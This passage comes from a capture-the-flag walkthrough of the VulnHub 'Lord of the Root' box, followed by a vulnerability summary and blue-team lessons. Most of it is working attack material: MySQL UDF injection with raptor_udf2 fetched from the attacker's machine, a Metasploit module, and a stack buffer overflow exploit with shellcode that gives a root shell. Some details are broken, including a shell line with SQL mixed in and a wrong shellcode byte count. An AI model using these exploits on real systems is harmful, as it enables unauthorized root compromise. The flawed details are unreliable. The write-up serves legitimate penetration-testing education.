> `www-data`.** Combined with "mysqld runs as root", that is a complete compromise
> chain from *any* web vulnerability — no kernel bug needed.

### 6.3 Build and inject the UDF

```bash
# on Kali: fetch raptor_udf2.c and serve it
wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
python3 -m http.server 8000
```

```bash
# on the target
smeagol@LordOfTheRoot:/tmp$ wget http://192.168.56.10:8000/raptor_udf2.c
smeagol@LordOfTheRoot:/tmp$ gcc -g -c raptor_udf2.c
smeagol@LordOfTheRoot:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

> **What those two `gcc` lines do:** the first compiles the C source to an object
> file (`-c`). The second links it into a **shared library** (`-shared`) with the
> `soname` embedded (`-Wl,-soname,…` passes the flag through to the linker). MySQL
> can only load `.so` files, so this is mandatory. `-lc` links libc.

```bash
smeagol@LordOfTheRoot:/tmp$ mysql -u root -pdarkshadow
```

```sql
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed

mysql> create table foo(line blob);
Query OK, 0 rows affected (0.01 sec)

mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out');
+-------------------------------------------------------------+
| do_system('id > /tmp/out; chown smeagol.smeagol /tmp/out')  |
+-------------------------------------------------------------+
|                                                           0 |
+-------------------------------------------------------------+
1 row in set (0.01 sec)

mysql> \q
```

```bash
smeagol@LordOfTheRoot:/tmp$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root)
smeagol@LordOfTheRoot:/tmp$ ./raptor_udf2.so 2>/dev/null; select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

*(run the `do_system` call from mysql again, then:)*

```bash
smeagol@LordOfTheRoot:/tmp$ /tmp/rootbash -p
root@LordOfTheRoot:/tmp# id
uid=0(root) gid=1000(smeagol) groups=0(root),1000(smeagol)
```

> **Step by step:**
> 1. `create table foo(line blob)` — a table with one binary column, used as a
>    staging area for the `.so` bytes.
> 2. `load_file('/tmp/raptor_udf2.so')` — MySQL reads the library from disk *into
>    the table*. (`secure_file_priv` must allow it.)
> 3. `SELECT ... INTO DUMPFILE '/usr/lib/mysql/plugin/…'` — MySQL writes those bytes
>    *back out* into its own plugin directory. **This is the trick:** the MySQL
>    process is root, so it can write where `smeagol` cannot.
> 4. `CREATE FUNCTION do_system RETURNS INTEGER SONAME '…'` — registers the exported
>    C symbol `do_system` as a SQL function.
> 5. `SELECT do_system('…')` — runs an arbitrary shell command **as root**.
>
> `cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash` then creates a **SUID-root
> bash** for persistence. **`-p`** is essential when launching it: bash drops
> privileges on startup unless `-p` (privileged mode) is given.

### 6.4 The Metasploit version

```bash
msf6 > use exploit/multi/mysql/mysql_udf_payload
msf6 exploit(multi/mysql/mysql_udf_payload) > set RHOSTS 192.168.56.101
msf6 exploit(multi/mysql/mysql_udf_payload) > set USERNAME root
msf6 exploit(multi/mysql/mysql_udf_payload) > set PASSWORD darkshadow
msf6 exploit(multi/mysql/mysql_udf_payload) > set LHOST 192.168.56.10
msf6 exploit(multi/mysql/mysql_udf_payload) > exploit
```

> **Note:** MySQL on this box listens only on `127.0.0.1` (`bind-address =
> 127.0.0.1` in `/etc/mysql/my.cnf`), so you reach it either from a shell on the
> box, or by **SSH local port forwarding**:
> ```bash
> ssh -L 13306:127.0.0.1:3306 smeagol@192.168.56.101
> mysql -h 127.0.0.1 -P 13306 -u root -pdarkshadow
> ```
> `-L <localport>:<remotehost>:<remoteport>` makes `127.0.0.1:13306` on your Kali
> tunnel through SSH to `127.0.0.1:3306` **on the target**. Learn this pattern — it
> appears on every real engagement with a firewalled database or admin panel.

---

## 7. Privilege escalation — Path 3: a manual stack buffer overflow

This is the box's showpiece, and the most educational part. Take your time.

### 7.1 Find the vulnerable binary

```bash
smeagol@LordOfTheRoot:~$ ls -l /SECRET/door*/file
-rwsr-xr-x 1 root root 5150 Sep 23  2015 /SECRET/door1/file
-rwsr-xr-x 1 root root 7370 Sep 23  2015 /SECRET/door2/file
-rwsr-xr-x 1 root root 7370 Sep 23  2015 /SECRET/door3/file
```

> **All three are SUID root (`-rwsr-xr-x`, owner `root`).** The one that differs in
> **size (5150 bytes)** is the vulnerable one. The other two are decoys that print
> jokes. And because `ran_dir.py` shuffles them, **re-check the sizes each session.**
>
> Let us see what it does:

```bash
smeagol@LordOfTheRoot:~$ /SECRET/door1/file AAAAA
AAAAA
smeagol@LordOfTheRoot:~$ /SECRET/door1/file $(python3 -c 'print("A"*500)')
Segmentation fault (core dumped)
```

> **It echoes its argument back — and crashes on long input.** `Segmentation fault`
> means the program touched memory it was not allowed to. That is the fingerprint of
> a **stack buffer overflow**: an unbounded copy (`strcpy`) writing past the end of a
> fixed-size stack buffer, clobbering the saved return address.

### 7.2 Understand the stack layout (the theory you need)

When `main()` calls `strcpy(buffer, argv[1])`, the stack looks like this:

```text
  high addresses
  ┌──────────────────────────┐
  │  argv, environment       │
  ├──────────────────────────┤
  │  saved EBP               │  <- overwritten by our padding
  ├──────────────────────────┤
  │  saved EIP (return addr) │  <- THE TARGET: 4 bytes we control
  ├──────────────────────────┤
  │  ...                     │
  ├──────────────────────────┤
  │  char buffer[N]          │  <- where strcpy writes
  └──────────────────────────┘
  low addresses  (stack grows downward)
```

On **x86 (32-bit)**:
- **EIP** = "Extended Instruction Pointer" — the address of the *next* instruction
  to execute.
- **ESP** = "Stack Pointer" — the top of the stack.
- **EBP** = "Base Pointer" — the frame anchor.

If we write `N` bytes of padding, then **4 bytes that land exactly on the saved
EIP**, then whatever follows, we control where execution goes when `main` returns.
`N` is the **offset**. Everything after the offset is our payload.

The classic payload arrangement:

```text
[ "A" * offset ] [ address of "jmp esp" ] [ NOP sled ] [ shellcode ]
```

Why `jmp esp`? Because after our buffer we control the stack immediately *below*
EIP, and `ESP` points right there at that moment. So if we overwrite EIP with the
address of a `jmp esp` instruction, the CPU jumps to ESP — i.e. into our sled.
A **NOP sled** (`0x90` = x86 "no operation") gives us slack: if ESP lands anywhere
in the sled, it slides harmlessly down into the shellcode. That is how you survive
not knowing the exact address.

### 7.3 Find the offset

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
```

```text
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9
```

> **Why a "cyclic pattern" instead of 500 A's?** Every 4-byte window in this string
> is **unique**. So when the crash tells you EIP = `0x37654136`, you can look that
> exact value up and instantly learn *how far into the buffer* it came from — the
> offset. With `AAAA…` every window is identical and you learn nothing.

```bash
smeagol@LordOfTheRoot:~$ /SECRET/door1/file 'Aa0Aa1Aa2Aa3...(500 chars)...Bj9'
Segmentation fault (core dumped)
```

Read the crash with `dmesg` (fastest, no debugger needed):

```bash
smeagol@LordOfTheRoot:~$ dmesg | tail -3
[ 1204.112331] file[4521]: segfault at 37654136 ip 0000000037654136 sp 00000000bffffb80 error 14 in file[8048000+1000]
```

> **Read the kernel's segfault line:**
> - `ip 0000000037654136` → **the instruction pointer was overwritten with
>   `0x37654136`.** That is our cyclic pattern, ASCII-reversed.
> - `sp 00000000bffffb80` → **the stack pointer at crash time.** We will need an
>   address near this.
> - `error 14` → a page-fault error code; `14` = user-mode, instruction fetch, page
>   not present. In other words: "we tried to execute at an unmapped address" —
>   precisely what overwriting EIP does.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 37654136
```

```text
[*] Exact match at offset 268
```

> **Offset = 268.** So: 268 bytes of padding, then 4 bytes of EIP, then our sled and
> shellcode.

### 7.4 Confirm exact EIP control

```bash
smeagol@LordOfTheRoot:~$ /SECRET/door1/file $(python3 -c 'print("A"*268 + "BBBB")')
Segmentation fault (core dumped)
smeagol@LordOfTheRoot:~$ dmesg | tail -1
[ 1288.441202] file[4588]: segfault at 42424242 ip 0000000042424242 sp 00000000bffffb80 error 14 in file[8048000+1000]
```

> **`ip 0000000042424242` — four `B`s = `0x42` each.** We control EIP precisely.
> This is the moment every buffer-overflow walkthrough builds to.

### 7.5 Find a `jmp esp` gadget

We cannot hard-code the stack address reliably (ASLR and environment size change
it), so instead we jump to an instruction that transfers control to ESP.

```bash
smeagol@LordOfTheRoot:~$ objdump -D /SECRET/door1/file | grep -E 'jmp.*esp|call.*esp'
  80484af:	ff e4                	jmp    *%esp
```

> **`0x80484af`** contains `ff e4` = `jmp esp`. And crucially it is inside the
> **binary itself**, which is loaded at a fixed address (`file[8048000+1000]` from
> the segfault line) because this program was compiled **without PIE** (Position
> Independent Executable).
>
> **Why that matters:** modern Linux defaults to `-fPIE -pie`, so the binary's base
> address is randomised per execution and this gadget address would be useless. On
> 2015-era Ubuntu, non-PIE was the default for user programs. The overflow only works
> because of *two* missing mitigations: **no PIE** and **an executable stack**.

### 7.6 Check for bad characters

```bash
smeagol@LordOfTheRoot:~$ /SECRET/door1/file $(python3 -c 'import sys; sys.stdout.write("A"*268 + "BBBB" + "".join(chr(c) for c in range(1,256)))')
```

> **Why:** `strcpy` stops at **`0x00` (NUL)**, so NUL can never appear in our
> payload. Bytes like `0x0a` (newline) and `0x0d` (carriage return) also frequently
> truncate input when it travels through shells or protocols. Send `\x01`–`\xff` and
> see which ones fail to survive; exclude those from shellcode generation
> (`-b '\x00\x0a\x0d'` in msfvenom).

### 7.7 Generate shellcode

```bash
msfvenom -p linux/x86/exec CMD=/bin/sh -b '\x00\x0a\x0d' -f python -v shellcode
```

```text
[-] No platform was selected, choosing Msf::Module::Payload::Cmd::Generic from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of python file: 343 bytes
shellcode =  ""
shellcode += "\xbb\x9a\x62\x04\x07\xd9\xee\xd9\x74\x24\xf4\x58\x31"
shellcode += "\xc9\xb1\x0b\x31\x58\x15\x03\x58\x15\x83\xc0\x70\x47"
shellcode += "\x85\x23\x8e\x77\x63\x0b\x1a\x6f\x0b\x8c\x4d\x2c\x14"
shellcode += "\x9d\x4f\x4f\x66\x9a\x8d\x24\x75\x4a\x99\x2a\x0e\xea"
shellcode += "\xe8\x2d\xa2\x17\x8f\x19\x01\x9d\x13\x10\x66\x5d\x0c"
shellcode += "\xd7"
```

> **`msfvenom` vocabulary:**
> - `-p linux/x86/exec CMD=/bin/sh` → the **payload**: execute `/bin/sh`.
>   (`linux/x86/shell_reverse_tcp LHOST=… LPORT=…` gives you a networked shell
>   instead.)
> - `-b '\x00\x0a\x0d'` → **bad characters** the encoder must avoid.
> - `-f python -v shellcode` → output as a Python string variable.
> - `x86/shikata_ga_nai` → a **polymorphic additive-feedback encoder**: it XORs the
>   shellcode with a random key and prepends a tiny decoder stub, so the byte
>   pattern differs every generation. Historically used to evade signature-based
>   AV; it does nothing against a kernel, it just conveniently also satisfies the
>   bad-character constraint.

### 7.8 Fire the exploit

The critical subtlety: **the stack address changes with the environment.** `gdb`
sets `LINES`/`COLUMNS`, so addresses seen in the debugger differ from the real run.
Fix the environment with `env -` so ESP is deterministic.

```bash
smeagol@LordOfTheRoot:~$ env - ESP=$(python3 -c 'print("A"*268)') /SECRET/door1/file x
smeagol@LordOfTheRoot:~$ gdb -q /SECRET/door1/file
```

```text
Reading symbols from /SECRET/door1/file...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x804844b
(gdb) run $(python3 -c 'print("A"*500)')
Starting program: /SECRET/door1/file $(python3 -c 'print("A"*500)')
Breakpoint 1, 0x0804844b in main ()
(gdb) info registers esp
esp            0xbffffb70	0xbffffb70
```

> **ESP ≈ `0xbffffb70`.** We will aim slightly *below* it and cover the gap with a
> NOP sled.

Build the payload:

```bash
smeagol@LordOfTheRoot:~$ /SECRET/door1/file $(python3 -c '
import sys
padding  = "A"*268
# jmp esp address, little-endian: 0x080484af -> af 84 04 08
eip      = "\xaf\x84\x04\x08"
nopsled  = "\x90"*32
shellcode= ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
            "\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")   # execve("/bin/sh")
sys.stdout.write(padding + eip + nopsled + shellcode)
')
```

```text
# id
uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)
# cd /root
# cat Flag.txt
Th3 fl4g is: 0ff1c3r1c4llyr00t3d
```

> **Little-endian.** x86 stores multi-byte integers **least-significant byte first**.
> So the address `0x080484af` goes into the payload as the bytes `af 84 04 08`.
> Getting this backwards is the single most common beginner mistake in buffer
> overflows.
>
> **`euid=0(root)`** — this is a **SUID** elevation, not a login as root. The *real*
> UID stays `smeagol` while the *effective* UID becomes 0, and permission checks use
> the effective UID. That is why `cat /root/Flag.txt` works.
>
> **The shellcode, decoded instruction by instruction:**
> ```asm
> 31 c0           xor eax, eax          ; eax = 0
> 50              push eax              ; NUL terminator for the string
> 68 2f 2f 73 68  push 0x68732f2f       ; "//sh"
> 68 2f 62 69 6e  push 0x6e69622f       ; "/bin"
> 89 e3           mov ebx, esp          ; ebx -> "/bin//sh"
> 50              push eax              ; argv[1] = NULL
> 53              push ebx              ; argv[0] = "/bin//sh"
> 89 e1           mov ecx, esp          ; ecx -> argv[]
> b0 0b           mov al, 0x0b          ; syscall 11 = execve
> cd 80           int 0x80              ; execve("/bin//sh", argv, NULL)
> ```
> It is the classic 28-byte `execve("/bin/sh")`. Note there is **no NUL byte** and
> no `0x0a`/`0x0d` — exactly what `strcpy` requires.
>
> **If it does not work first try** (it rarely does), the usual causes are:
> - wrong endianness on the EIP;
> - the environment differs between your test and the real run → use `env -` or
>   `unset LINES COLUMNS`;
> - ESP drifted → widen the NOP sled to 64–128 bytes and try addresses in a small
>   range in a loop:
>   ```bash
>   for off in $(seq 0xbffffb00 0x10 0xbffffc00); do
>     ./exploit.sh "$off" && break
>     sleep 1
>   done
>   ```

![Buffer overflow giving euid=0](images/06-bof.png)

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Port knocking as the only access control | `knockd`, sequence `1,2,3` | Service hidden, then trivially revealed |
| 2 | Base64 hint in an HTML comment | `/robots.txt` source | Disclosed the hidden app path `/978345210/` |
| 3 | **SQL injection** (boolean-blind, time-blind, UNION) | `/978345210/index.php`, `username` POST param | Full database disclosure |
| 4 | **Passwords stored in plaintext** | `Webapp.Users` | 5 credentials recovered instantly |
| 5 | **Credential reuse across services** | web DB → SSH | Remote foothold as `smeagol` |
| 6 | **Unpatched kernel** (CVE-2015-1328 overlayfs) | Ubuntu 14.04, 3.13.0-65 | `smeagol` → root (Path 1) |
| 7 | **MySQL daemon running as root + root credentials in a web config** | `mysqld`, `/var/www/978345210/config.php` | UDF injection → root (Path 2) |
| 8 | **SUID-root binary with `strcpy` overflow, no PIE, executable stack** | `/SECRET/door{1,2,3}/file` | EIP control → `euid=0` (Path 3) |
| 9 | MySQL bound to localhost only | `/etc/mysql/my.cnf` | *Mitigating* control — but defeated by SSH tunnelling |

## 9. Defensive lessons (blue team)

1. **Port knocking is not authentication.** If you need a service hidden, put it
   behind a VPN, mutual TLS, or a bastion with real authentication. Knocking only
   defeats *unauthenticated* scanners; it does nothing against anyone who can read a
   pcap.
2. **Use parameterised queries (prepared statements).** This single change kills the
   SQLi outright:
   ```php
   $stmt = $pdo->prepare('SELECT * FROM Users WHERE username = :u AND password = :p');
   $stmt->execute([':u' => $_POST['username'], ':p' => $_POST['password']]);
   ```
   Never build SQL by concatenating user input. Add a WAF rule as defence-in-depth,
   not as the primary control.
3. **Never store plaintext passwords.** Use `password_hash($pw, PASSWORD_ARGON2ID)`
   / `bcrypt` and verify with `password_verify()`. Here the plaintext storage turned
   one SQLi into five usable accounts.
4. **Do not reuse credentials across systems**, and never ship the same password in a
   DB and on SSH. Enforce with `pam_cracklib`/`pam_pwquality` plus a breached-list
   check.
5. **Patch the kernel.** Ubuntu 14.04 needed `USN-2641-1` (linux 3.13.0-55) or later
   for CVE-2015-1328. The box ran 3.13.0-65, which is *after* that — but the
   overlayfs user-namespace behaviour still needed restricting. Set
   `kernel.unprivileged_userns_clone=0` and keep `user.max_user_namespaces` low.
6. **Run databases as their own unprivileged user.** `mysqld` must run as `mysql`,
   never root. Then UDF injection gets you the `mysql` user, not root. Also:
   ```sql
   SET GLOBAL secure_file_priv = '/var/lib/mysql-files';
   -- and remove FILE privilege from application accounts
   REVOKE FILE ON *.* FROM 'root'@'localhost';
   ```
   `secure_file_priv` is what stops `SELECT … INTO DUMPFILE '/usr/lib/mysql/plugin/'`.
7. **Keep secrets out of source files.** `config.php` with `root:darkshadow`
   world-readable under the web root is a total-compromise primitive. Use
   environment variables injected by your process manager, or a vault.
8. **Compile with modern mitigations.** `-fstack-protector-strong -D_FORTIFY_SOURCE=2
   -pie -fPIE -Wl,-z,relro,-z,now -z noexecstack`. Enable system-wide
   `kernel.randomize_va_space=2`, and NX/DEP. Any one of these would have broken
   Path 3.
9. **Never ship SUID-root binaries you do not fully control.** The `/SECRET/door*/file`
   set is exactly what a SUID audit should flag and remove.
10. **Detection opportunities.** `segfault … ip <low-address> … error 14` lines in
    `dmesg`/`/var/log/kern.log` are a *very* high-fidelity buffer-overflow signal —
    alert on them. Also alert on: `mysqld` writing to `/usr/lib/mysql/plugin/`,
    any process creating `/etc/ld.so.preload`, `gcc` being invoked by a service
    account, and SQL queries containing `SLEEP(`, `UNION ALL SELECT`, or
    `load_file(`.

---

## 10. References

- VulnHub entry: <https://vulnhub.com/entry/lord-of-the-root-101,129/>
- Community writeups consulted:
  - [yufongg — Lord of the Root 1.0.1 (writeups repo, all 3 privesc paths)](https://github.com/yufongg/writeups/blob/main/Vulnhub/Linux/Lord%20of%20the%20Root%201.0.1/Lord%20of%20the%20Root%201.0.1.md)
  - [bhardwajmanish — Lord Of The Root: 1.0.1 Vulnhub Walkthrough](https://bhardwajmanish.com/lord-of-the-root-1-0-1-vulnhub-walkthrough/)
  - [z6157881 — Lord Of The Root: 1.0.1 Vulnhub Walkthrough](https://medium.com/@z6157881/lord-of-the-root-1-0-1-vulnhub-walkthrough-25f7161c7e7b)
  - [seekorswim — Lord Of The Root: 1.0.1](https://seekorswim.github.io/walkthroughs/2019-05-06/lord-of-the-root-1.0.1/)
  - [barrebas — Lord of the Root (ROP variant)](http://barrebas.github.io/blog/2015-10-04/lord-of-the-root/)
  - [Information Security Inc. — Lord of the Root (PDF slides)](https://www.isec.ne.jp/wp-content/uploads/2017/08/20Lord-of-the-Root.pdf)
  - [abinsecurityresearcher — Lord Of The Root: 1.0.1 : Walkthrough](https://medium.com/@abinsecurityresearcher/lord-of-the-root-1-0-1-walkthrough-401f0e57866b)
- Exploits / advisories:
  - [CVE-2015-1328 — overlayfs local privilege escalation](https://nvd.nist.gov/vuln/detail/CVE-2015-1328)
  - [Exploit-DB 37292 — Linux Kernel 3.13.0 < 3.19 overlayfs LPE](https://www.exploit-db.com/exploits/37292)
  - [Exploit-DB 39166 — Linux Kernel 3.19.0-25 < 3.19.0-43 overlayfs LPE](https://www.exploit-db.com/exploits/39166)
  - [Ubuntu USN-2641-1 — linux kernel vulnerabilities](https://ubuntu.com/security/notices/USN-2641-1)
  - [raptor_udf2.c — MySQL UDF privilege escalation](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
  - [Metasploit — mysql_udf_payload](https://www.rapid7.com/db/modules/exploit/multi/mysql/mysql_udf_payload/)
- Background reading:
  - [knockd — port knocking daemon](http://www.zeroflux.org/projects/knock)
  - [sqlmap user's manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
  - [Smashing the Stack for Fun and Profit (Phrack 49)](https://phrack.org/issues/49/14.html)
  - [Exploit Writing Tutorial Part 1 — Stack Based Overflows (Corelan)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
  - [msfvenom / metasploit pattern_create & pattern_offset](https://docs.metasploit.com/)
  - [CyberChef](https://gchq.github.io/CyberChef/) · [GTFOBins](https://gtfobins.github.io)

---

## 11. Screenshot checklist

- [ ] `images/01-knock.png` — before/after `nmap`, showing :1337 appear
- [ ] `images/02-base64.png` — nested base64 decoding to `/978345210/index.php`
- [ ] `images/03-sqlmap.png` — the `Users` table dump
- [ ] `images/04-ssh.png` — SSH login as `smeagol`
- [ ] `images/05-flag.png` — overlayfs exploit → root → `Flag.txt`
- [ ] `images/06-bof.png` — `pattern_offset` result and the overflow shell

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
